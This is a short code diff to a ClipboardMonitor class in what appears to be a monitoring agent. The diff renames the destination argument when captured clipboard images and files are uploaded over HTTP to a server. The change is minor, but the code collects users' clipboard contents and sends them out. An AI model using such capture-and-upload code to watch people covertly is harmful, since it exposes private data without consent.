@@ -168,7 +168,7 @@ class ClipboardMonitor(Job):
                 try:
                     self.upload_file_via_http(
                         file_name,
-                        'clipboard_image'
+                        folder='Clipboard'
                     )
                     self.send_to_server(
                         1,
@@ -243,7 +243,7 @@ class ClipboardMonitor(Job):
 
                     self.upload_file_via_http(
                         file_path,
-                        'clipboard_file'
+                        folder='Clipboard'
                     )
 
                     self.send_to_server(
